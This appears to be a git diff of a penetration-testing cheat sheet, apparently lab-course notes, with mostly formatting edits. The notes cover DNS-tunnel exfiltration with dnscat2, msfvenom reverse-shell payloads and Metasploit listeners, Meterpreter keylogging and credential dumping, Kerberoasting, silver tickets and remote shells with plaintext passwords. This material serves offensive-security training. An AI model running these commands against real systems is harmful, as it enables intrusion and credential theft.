@@ -2340,7 +2298,7 @@ DNS tunneling is certainly not stealthy, i.e., a huge data transfer from the dns
 sudo dnsmasq -C dnsmasq.conf -d
 ```
 
-Check the client DNS settings using the resolvectl utility
+Check the client DNS settings
 
 ```bash
 resolvectl status
@@ -2349,7 +2307,7 @@ nslookup exfiltrated-data.feline.corp
 nslookup -type=txt www.feline.corp
 ```
 
-A **dnscat2** server runs on an authoritative name server (FELINEAUTHORITY) for a particular domain
+A **dnscat2** server runs on an authoritative name server for a particular domain
 
 ```bash
 dnscat2-server feline.corp
@@ -2364,6 +2322,7 @@ Run the dnscat client binary on PGDATABASE
 This configuration ignores the `/etc/resolv.conf` and `/etc/hosts` files and only defines the `auth-zone` and `auth-server` variables. These tell Dnsmasq to act as the authoritative name server for the feline.corp zone.
 
 `dnsmasq_txt.conf`
+
 ```
 # Do not read /etc/resolv.conf or /etc/hosts
 no-resolv
@@ -2418,10 +2377,10 @@ Start the database service as well as create and initialize the MSF database
 sudo msfdb init
 ```
 
-Launch the Metasploit command-line interface, to hide the banner and version information while starting up, we can add the -q option
+* -q: hide the banner and version information while starting up
 
 ```bash
-sudo msfconsole
+sudo msfconsole -q
 ```
 
 ```
@@ -2448,6 +2407,7 @@ search type:auxiliary smb
 ```
 
 Activate a module with **module name**, or **index** (56) provided from search results
+
 ```
 use 56
 ```
@@ -2476,6 +2436,7 @@ jobs
 ```
 
 Metasploit uses **sessions** to manage access to different machines.
+
 ```
 sessions -l
 sessions -i 2
@@ -2514,7 +2475,7 @@ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -
 
 ## Meterpreter Command
 
-Session
+### Session
 
 ```
 help
@@ -2544,7 +2505,7 @@ upload /usr/bin/unix-privesc-check /tmp/
 upload chisel.exe C:\\Users\\marcus\\chisel.exe
 ```
 
-Channel
+### Channel
 
 ```
 Ctrl + Z
@@ -2630,6 +2591,7 @@ keyscan_stop
 ```
 
 Retrieve LM/NTLM creds (parsed)
+
 ```
 load kiwi
 help
@@ -2668,6 +2630,7 @@ Some of these scripts use the global datastore of Metasploit to set options such
 - We can also define values for options across all modules by setting global options. These options can be set with `setg` and unset with `unsetg`.
 
 `listener.rc`
+
 ```
 use exploit/multi/handler
 set PAYLOAD windows/meterpreter_reverse_https
@@ -2830,9 +2793,9 @@ The permissions required to enumerate sessions with NetSessionEnum are defined i
 Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
 ```
 
-  - The BUILTIN group, NT AUTHORITY group, CREATOR OWNER and APPLICATION PACKAGE AUTHORITY are defined by the system, and do not allow NetSessionEnum to enumerate this registry key from a remote standpoint.
-  - The long string in the end of the output is a **capability SID**. A capability SID is an unforgeable token of authority that grants a Windows component or a Universal Windows Application access to various resources. However, it will not give us remote access to the registry key of interest.
-  - In older Windows versions, **Authenticated Users** were allowed to access the registry hive and obtain information from the SrvsvcSessionInfo key. However, following the least privilege principle, regular domain users should not be able to acquire this information within the domain.
+- The BUILTIN group, NT AUTHORITY group, CREATOR OWNER and APPLICATION PACKAGE AUTHORITY are defined by the system, and do not allow NetSessionEnum to enumerate this registry key from a remote standpoint.
+- The long string in the end of the output is a **capability SID**. A capability SID is an unforgeable token of authority that grants a Windows component or a Universal Windows Application access to various resources. However, it will not give us remote access to the registry key of interest.
+- In older Windows versions, **Authenticated Users** were allowed to access the registry hive and obtain information from the SrvsvcSessionInfo key. However, following the least privilege principle, regular domain users should not be able to acquire this information within the domain.
 
 
 ```pwsh
@@ -2936,7 +2899,6 @@ Find-DomainShare
 
 ```pwsh
 ls \\dc1.corp.com\sysvol\corp.com\
-cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
 ```
 
 Decrypts a given GPP encrypted string
@@ -2949,8 +2911,8 @@ Discover the domain controller's hostname
 
 ```
 nslookup
-set type=all
-_ldap._tcp.dc._msdcs.sandbox.local
+> set type=all
+> _ldap._tcp.dc._msdcs.sandbox.local
 ```
 
 ## Active Directory - Automated Enumeration
@@ -2982,16 +2944,13 @@ MATCH (m:User) RETURN m
 MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
 ```
 
-Pre-built queries
-
-```
-Find all Domain Admins
-Find Workstations where Domain Users can RDP
-Find Servers where Domain Users can RDP
-Find Computers where Domain Users are Local Admin
-Shortest Path to Domain Admins from Owned Principals
-List all Kerberoastable Accounts
-```
+Pre-built queries:
+- Find all Domain Admins
+- Find Workstations where Domain Users can RDP
+- Find Servers where Domain Users can RDP
+- Find Computers where Domain Users are Local Admin
+- Shortest Path to Domain Admins from Owned Principals
+- List all Kerberoastable Accounts
 
 # Attacking Active Directory Authentication
 
@@ -3219,7 +3178,7 @@ If we have GenericWrite or GenericAll permissions on another AD user account, we
 If `impacket-GetUserSPNs` throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use `ntpdate` or `rdate` to do so.
 
 ```bash
-sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
+impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
 ```
 
 ```bash
@@ -3258,7 +3217,6 @@ With the service account password or its associated NTLM hash at hand, we can fo
 => silver ticket
 
 If the service principal name is used on multiple servers, the silver ticket can be leveraged against them all.
-
 
 In general, we need to collect the following three pieces of information to create a silver ticket:
 
@@ -3399,6 +3357,21 @@ Enter-PSSession 1
 ```pwsh
 $dcsesh = New-PSSession -Computer SANDBOXDC
 Invoke-Command -Session $dcsesh -ScriptBlock {ipconfig}
+```
+
+**PowerShell Remoting** by default uses **WinRM** for Cmdlets such as `Enter-PSSession`. => user needs to be in the local group **Windows Management Users**. However, instead of WinRM, **SSH** can also be used for PowerShell remoting.
+
+Note that creating a PowerShell remoting session via WinRM in a **bind shell** can cause unexpected behavior.
+
+```pwsh
+$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
+
+Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
+```
+
+```bash
+evil-winrm -i 192.168.50.220 -u daveadmin -p "password"
 ```
 
 ## SysInternals PsExec
@@ -3636,12 +3609,7 @@ msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reve
 ```
 
 ```bash
-sudo msfconsole -q -x "use exploit/multi/handler;\
-                          set PAYLOAD windows/meterpreter/reverse_tcp;\
-                          set AutoRunScript post/windows/manage/migrate;\
-                          set LHOST 10.11.0.4;\
-                          set LPORT 80;\
-                          run"
+sudo msfconsole -q -x "use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp;set AutoRunScript post/windows/manage/migrate;set LHOST 10.11.0.4;set LPORT 80;run"
 ```
 
 ## PowerShell
@@ -3892,7 +3860,6 @@ move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
 
 ```bash
 sudo mkdir /var/www/uploads
-ps -ef | grep apache
 sudo chown www-data: /var/www/uploads
 ```
 
@@ -4116,6 +4083,12 @@ Set-RemoteRegistryValue @remoteKeyParams -Credential $credObject
 Stop-Process -processname calc
 ```
 
+Install the Telnet client
+
+```pwsh
+dism /online /Enable-Feature /FeatureName:TelnetClient
+```
+
 # Miscellaneous
 
 PHP Web Shell
@@ -4171,4 +4144,26 @@ ruby -run -e httpd . -p 9000
 
 ```bash
 busybox httpd -f -p 10000
+```
+
+Simulate an admin user login: `powershell -ep Bypass -File admin_login.ps1`
+
+`admin_login.ps1`
+
+```pwsh
+$username="admin"
+$password="p@ssw0rd"
+$url_login="127.0.0.1/login.php"
+
+$ie = New-Object -com InternetExplorer.Application
+$ie.Visible = $true
+$ie.navigate("$url_login")
+while($ie.ReadyState -ne 4){ start-sleep -m 1000}
+$ie.document.getElementsByName("username")[0].value="$username"
+$ie.document.getElementsByName("password")[0].value="$password"
+start-sleep -m 10
+$ie.document.getElementsByClassName("btn")[0].click()
+start-sleep -m 100
+$ie.Quit()
+[System.Runtime.Interopservices.Marshal]::ReleaseComObject($ie)
 ```
